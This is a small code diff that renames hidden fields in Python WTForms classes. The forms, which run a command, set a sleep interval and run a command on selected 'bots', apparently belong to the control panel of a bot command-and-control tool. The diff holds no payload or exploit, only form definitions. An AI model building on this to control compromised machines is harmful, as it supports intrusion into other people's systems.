@@ -5,11 +5,11 @@ from wtforms.validators import DataRequired, Length, NumberRange
 
 class RunCommand(Form):
     command = StringField("Command:", validators=[DataRequired(), Length(max=2048)])
-    cmdip = HiddenField()
+    cmdid = HiddenField()
 
 class SetSleepInterval(Form):
     interval = IntegerField("Interval: ", validators=[NumberRange(min=1)])
-    intip = HiddenField()
+    intid = HiddenField()
 
 class RunCommandOnAll(Form):
     bots = SelectMultipleField("Bots", option_widget=CheckboxInput())
